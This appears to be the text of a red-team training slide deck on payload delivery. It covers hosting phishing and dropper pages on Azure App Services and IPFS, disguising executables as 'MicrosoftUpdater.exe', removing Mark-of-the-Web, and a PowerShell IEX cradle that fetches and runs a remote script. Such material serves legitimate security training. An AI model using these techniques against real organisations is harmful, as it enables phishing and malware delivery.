@@ -1,0 +1,358 @@
+ENTERPRISE
+ATTACK 
+INITIAL ACCESS
+Payload Delivery
+WEBINAR 
+Introduction
+Enter:_
+Your Instructor
+Steve Borosh 
+github.com/rvrsh3ll 
+@424f424f
+• U.S. Army Infantry Veteran
+• Hacking the Gibson since 1996
+• Professionally since 2014
+• Instructor: Blackhat, Fortune 500, 
+Federal Law Enforcement
+• Conference Presenter: BSidesLV, 
+BSidesNOVA, HACKMIAMI
+3
+• One module from “Enterprise Attack: Initial Access”.
+• https://www.antisyphontraining.com/enterprise-
+attack-initial-access-w-steve-borosh/
+• March 1st – 4th
+• May 17th – 20th
+MAIN COURSE INFO
+COURSE TOPICS
+• Offensive Infrastructure
+• Reconnaissance
+• Password Spraying
+• Command and Control Design and Implementation
+• Payload Generation
+• Payload Delivery (This webinar and more)
+• The Perimeter
+• Phishing
+• Abusing Microsoft 365 Access
+• File/Tool/Payload Serving
+• Azure App Services
+• InterPlanetary File System (IPFS)
+• LAB
+WEBINAR TOPICS
+INTRODUCTION
+• Threat-actors often have a goal in mind when targeting 
+an organization. That goal will require some sort of 
+access to data. 
+• Access to data may be targeted, opportunistic, or even 
+paid for. 
+• Offensive goals:
+• Ransomware
+• Intellectual Property Theft
+• Service Disruption
+• Kinetic
+7
+FILE SERVING
+Payloads, delivery methods, and additional considerations.
+• User-Interaction
+• Clicking a link.
+• Downloading a file.
+• Entering credentials (usernames,passwords,codes).
+• Opening an email.
+• Code execution
+• Malware/C2.
+• Ransomware.
+• Automated tooling.
+• Access to read/write target data.
+Initial Access 
+Requirements
+PAYLOADS
+• Payload Examples
+• Malware/C2
+• Tools/Software
+• Office Documents
+• Shortcuts (.lnk)
+• Other Files (.iso,.zip,.7z)
+• In-Memory or On-Disk
+• Links
+• Click-track, cred steal, file download
+10
+DELIVERY METHODS
+• HTTP(S) Browser Download
+• Email
+• Beware blocked extensions list
+• Chat/Microsoft Teams
+• Physical Drop
+• Remote Code Execution
+• Log Poisoning
+• Phone/SMS
+• SQL/Command Injection
+• Ion Cannon
+11
+HOSTING 
+CONSIDERATIONS
+• Where are your files stored?
+• Virtual Private Servers
+• On-Prem
+• Third-Party Services (Office 365, Google Drive)
+• AWS Buckets
+• Azure Storage
+• How will your target reach the file?
+• Web Browser (Chrome? Edge?)
+• Do they traverse through a proxy?
+• TLS Inspection
+• DNS or IP Address?
+• Reputation/categorization
+12
+THIRD PARTY SERVICES
+• Understand the terms 
+of service.
+• Secure the 
+infrastructure.
+• Consider the geo 
+location.
+• Beware the ban 
+hammer!
+13
+COMMON PAYLOADS
+• Executables 
+• Compressed Files
+• Scripts
+• Shortcuts
+• Office Docs
+• Email pretext/links
+14
+COMMON DROPPER SITES
+• VPS
+• Compromised Site
+• Third-Party (Upload)
+• Chat/File Sharing
+15
+WHISPERGATE Example
+https://twitter.com/ESETresearch/status/1483161464106098689
+MIME TYPES
+• Identifies the type of media being served.
+• Some platforms or protections may block certain MIME 
+types.
+• May be controlled by web.config.
+• Header: “Content-Type: application/pdf”
+• application/vnd.microsoft.portable-executable
+• application/vnd.ms-powerpoint
+• application/octet-stream
+17
+MARK OF THE WEB -
+MOTW
+• Alternate Data Stream 
+“MicrosoftUpdater.exe:Zone.Identifier$DATA”.
+• Provides software the ability to determine security 
+features of files such as those downloaded from the 
+Internet.
+18
+ALTERNATE DATA 
+STREAM EXAMPLE
+• Users may “Unblock” the file(s) without administrative 
+privileges.
+• Some do it if you ask nicely by email 
+BLOCKED FILES
+MOTW CONTINUED
+• Remove with PowerShell
+ls C:\Users\User\Downloads\*.* | Unblock-File
+• Some files and programs do not apply the 
+Zone.Identifier to files inside a container. Examples are 
+.iso/.img files when double clicked and when 7zip opens 
+a file.
+21
+PROXY CONSIDERATIONS
+• Organizations may monitor boundary traffic for:
+• DNS Twisted Domains
+• Newly Registered Domains
+• Uncategorized Domains
+• Dotted-quads; 199.x.x.x
+• Known-bad IP’s or service ranges
+• We need a domain or service with a good reputation.
+• We need options. APT groups have time and $$ while 
+professional offensive practitioners are limited mainly 
+by time.
+22
+Azure App 
+Services
+AzURE APP SERVICES
+• Host files on https://domain.azurewebsites.net.
+• Several platform options
+• Python
+• .NET,.NET CORE
+• NodeJS
+• PHP
+• Deployable with UI or programmatically.
+• May also perform C2 redirection.
+24
+Azure app tools 
+setup
+• Clone the repo
+https://github.com/rvrsh3ll/Azure-App-Tools
+• Modify the default index.html or other code to suit your 
+needs.
+• Copy calc.exe to test file downloads. 
+cp /mnt/c/Windows/System32/calc.exe MicrosoftUpdater.exe
+• Download and install Azure-cli
+• https://docs.microsoft.com/en-us/cli/azure/install-azure-cli-
+windows?tabs=azure-cli
+25
+dropper
+• Note: Comment the “File Download Popup” if you’re not 
+file serving. 
+26
+WEB.CONFIG
+• Enable Azure file downloads on IIS.
+27
+Azure app tools 
+deployment
+cd Azure-App-Tools/HTML-Phishing-Page/
+az login
+az webapp up --location eastus --resource-group myazureapps --name 
+mycustomsubdomain --html
+• When complete, your site will be browsable at 
+https://mycustomsubdomain.azurewebsites.net
+• Note: A unique-to-azure subdomain is required.
+28
+Azure app tools 
+webapp
+29
+Dropper example
+30
+Dropper site
+STOP
+WEB APP
+az webapp stop --resource-group futuresecapps –name futuresecapp1
+31
+Interplanetary 
+File System
+IPFS
+IPFS
+INTRO
+• The InterPlanetary File System (IFPS)
+• https://ipfs.io
+• When you add a file to IPFS, your file is split into smaller 
+chunks, cryptographically hashed, and given a unique 
+fingerprint called a content identifier (CID). This CID acts 
+as a permanent record of your file as it exists at that 
+point in time.
+•
+33
+IPFS LOOKUP
+• When other nodes look up your file, they ask their peer 
+nodes who's storing the content referenced by the file's 
+CID. When they view or download your file, they cache a 
+copy — and become another provider of your content 
+until their cache is cleared.
+34
+WHAT CAN I DO WITH 
+IPFS
+• Serve single files.
+• Raw text
+• Binary
+• Office Docs
+• NFT?
+• Serve a website
+• JavaScript file dropper
+• Clone target
+• Command and Control
+35
+EXAMPLE Crypto Site
+36
+SSL CERTIFICATES
+IPFS
+GATEWAYS
+• https://ipfs.github.io/public-gateway-checker/ 
+• https://ipfs.io/ipfs/
+• https://cloudflare-ipfs.io/ipfs/
+38
+• Does not like Double-NAT.
+• Works well from a VPS with or host with port 4001 open 
+or forwarded.
+• The command-line version hosts a web interface as well.
+• Try multiple gateways.
+IPFS Caveat
+IPFS DESKTOP CLIENT
+• https://github.com/ipfs/ipfs-desktop/releases
+40
+SHARE TEXT/SCRIPTS
+Import FILE
+Import the file from the desktop.
+Deploy Via GUI
+• Select and open your file or script.
+Imported file
+• Copy the share link.
+https://ipfs.io/ipfs/QmdVDHQMNaq9jnZPGdXn8dUY5QbR
+wCUHbCt1VYMDsnv4p4?filename=hello.ps1
+COPY LINK
+• From a PowerShell prompt, IEX the URL (after sync).
+iex(new-object 
+net.webclient).downloadstring("https://ipfs.io/ipfs/QmdVDHQMNaq9jnZPGdXn8
+dUY5QbRwCUHbCt1VYMDsnv4p4?filename=hello.ps1")
+INVOKE OVER IPFS
+DEPLOY VIA TERMINAL
+46
+• Install
+• https://dist.ipfs.io/#go-ipfs 
+• Docs
+• https://docs.ipfs.io/how-to/command-line-quick-start
+Initialization
+ipfs init
+ipfs daemon
+AddING A FILE
+ipfs add test.ps1
+Web UI
+49
+• http://localhost:5001/webui
+IPFS LAB
+Distributed File Sharing
+@futuresecio
+Create
+Folder
+Create a “Class” 
+folder on your VM 
+desktop.
+• Download the EAIA_PD.zip file from:
+• https://enterpriseattack.futuresec.io/enterprise-attack-
+payload-delivery-webcast/class-material
+• Extract the zip to the Class folder created earlier.
+EXTRACT ZIP
+OPEN TERMINAL
+• HOLD SHIFT and right-click in the folder to access 
+Windows Terminal.
+COPY CALC
+54
+cp C:\Windows\System32\calc.exe MicrosoftUpdater.exe
+Modify HTML
+• Right-click and open 
+index.html with Notepad 
+or VSCode
+• Enter some text in the 
+<h2>Text Here</h2> block
+• Save
+SETUP IPFS
+• Open IPFS Desktop Client.
+• Select the Folder tab.
+• Click +Import button.
+• Select “Folder”
+56
+SELECT FOLDER
+• Select the HTML-Phishing-Page sub directory.
+57
+Copy LINK
+58
+SYNCING
+• Node may take a few minutes to sync with peers.
+• Note: Port forwarding increases sync speed. 
+https://docs.ipfs.io/how-to/nat-configuration/#port-
+forwarding
+59
+BROWSE
+Remove Folder
+• (IPFS) https://ipfs.io
+• (Go-IPFS) https://github.com/ipfs/go-ipfs
+• (Azure Tools) https://github.com/rvrsh3ll/Azure-App-
+Tools
+• https://support.microsoft.com/en-us/office/blocked-
+attachments-in-outlook-434752e1-02d3-4e90-9124-
+8b81e49a8519?ui=en-us&rs=en-us&ad=us
+Resources
